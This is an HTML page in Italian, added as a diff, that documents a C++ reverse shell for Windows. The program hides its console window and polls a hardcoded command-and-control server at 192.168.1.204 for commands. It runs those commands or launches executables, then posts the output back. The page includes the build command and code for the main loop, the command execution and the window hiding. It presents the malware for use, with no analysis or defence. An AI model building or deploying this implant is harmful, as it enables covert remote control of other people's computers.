@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Documentazione Reverse Shell in C++</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #f4f4f4;
+            line-height: 1.6;
+        }
+        h1, h2, h3 {
+            color: #333;
+        }
+        code {
+            background-color: #272822;
+            color: #f8f8f2;
+            border: 1px solid #ddd;
+            padding: 5px;
+            display: block;
+            white-space: pre-wrap;
+            margin-bottom: 20px;
+        }
+        pre {
+            background-color: #f9f9f9;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+        }
+        .container {
+            max-width: 900px;
+            margin: auto;
+            background: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .code-block {
+            background-color: #272822;
+            color: #f8f8f2;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: "Courier New", Courier, monospace;
+            overflow-x: auto;
+        }
+        .code-block span {
+            color: #66d9ef;
+        }
+        .command {
+            background-color: #e7f3ff;
+            border-left: 5px solid #2196F3;
+            padding: 10px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>Documentazione: Reverse Shell in C++ con Richieste HTTP</h1>
+
+    <p>Questo programma implementa una <strong>reverse shell</strong> che consente di eseguire comandi su un server remoto tramite richieste HTTP. Il programma si connette a un server predefinito, recupera comandi da eseguire e invia l'output dei comandi al server. Utilizza la libreria <strong>WinINet</strong> per le comunicazioni HTTP, nascondendo la finestra della console per funzionare in background.</p>
+
+    <h2>Compilazione</h2>
+    <div class="command">
+        Puoi compilare questo programma utilizzando <strong>g++</strong> con i seguenti parametri di compilazione:
+        <pre>g++ -m32 -O2 -static-libgcc -static-libstdc++ -o reverseshell.exe reverseshell.cpp -mwindows -lwininet</pre>
+    </div>
+
+    <ul>
+        <li><strong>-m32</strong>: Compila a 32 bit.</li>
+        <li><strong>-O2</strong>: Ottimizza il codice.</li>
+        <li><strong>-static-libgcc -static-libstdc++</strong>: Collega staticamente le librerie per la portabilità.</li>
+        <li><strong>-mwindows</strong>: Nasconde la finestra della console al momento dell'esecuzione.</li>
+        <li><strong>-lwininet</strong>: Collega la libreria <strong>WinINet</strong> necessaria per le comunicazioni HTTP.</li>
+    </ul>
+
+    <h2>Descrizione del Codice</h2>
+
+    <h3>Costanti Globali</h3>
+    <p>Le seguenti variabili definiscono l'indirizzo del server e i percorsi per il file della shell e della pagina di output:</p>
+    <div class="code-block">
+        <code>string server = "192.168.1.204";<br>
+        string shellNo = "0";<br>
+        string shellFilePath = "/c2/shell"+shellNo+".txt";<br>
+        string outputPagePath = "/c2/output.php";</code>
+    </div>
+
+    <h3>Funzione <code>main</code></h3>
+    <p>La funzione principale esegue i seguenti passaggi:</p>
+    <ul>
+        <li><strong>Nascondere la finestra della console</strong>: Usa <code>hideWindow()</code> per nascondere la finestra della console e permettere al programma di funzionare in background.</li>
+        <li><strong>Ciclo infinito</strong>: Recupera il comando dal server usando <code>getCommand()</code>, esegue comandi ed eseguibili e invia l'output al server.</li>
+    </ul>
+    <pre class="code-block">
+        <code>int main() {<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;string command;<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;string result;<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;hideWindow();<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;while (true) {<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;command = getCommand(server, shellFilePath);<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (command.substr(0, 2) == "D|") {<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;command = command.substr(2, command.size());<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;executeCommand("start \"\" \"" + command + "\"", false);<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sendOutput(server, outputPagePath, "Eseguito!");<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else if (command != "") {<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result = executeCommand(command, true);<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (result == "") {<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sendOutput(server, outputPagePath, "output non letto");<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sendOutput(server, outputPagePath, result);<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sleep(5000);<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;return 0;<br>
+        }</code>
+    </pre>
+
+    <h3>Funzione <code>executeCommand</code></h3>
+    <p>Questa funzione esegue un comando di sistema e può opzionalmente restituire l'output.</p>
+    <pre class="code-block">
+        <code>string executeCommand(const string& command, bool getOutput) {<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;array&lt;char, 128&gt; buffer;<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;string result;<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;unique_ptr&lt;FILE, decltype(&pclose)&gt; pipe(popen(command.c_str(), "r"), pclose);<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;if (!pipe) {<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throw std::runtime_error("popen() failed!");<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;if (getOutput) {<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result += buffer.data();<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return result;<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+        }</code>
+    </pre>
+
+    <h3>Funzione <code>getCommand</code></h3>
+    <p>Recupera l'ultimo comando dal server. Se il comando inizia con <code>"D|"</code>, rappresenta un file eseguibile e viene trattato separatamente.</p>
+
+    <h3>Funzione <code>sendHttpRequests</code></h3>
+    <p>Invia richieste HTTP al server e raccoglie la risposta.</p>
+
+    <h3>Funzione <code>hideWindow</code></h3>
+    <p>Nasconde la finestra della console all'avvio del programma, utilizzando l'API di Windows:</p>
+    <pre class="code-block">
+        <code>void hideWindow() {<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;HWND hwnd = GetConsoleWindow();<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;ShowWindow(hwnd, SW_HIDE);<br>
+        }</code>
+    </pre>
+
+</div>
+
+</body>
+</html>
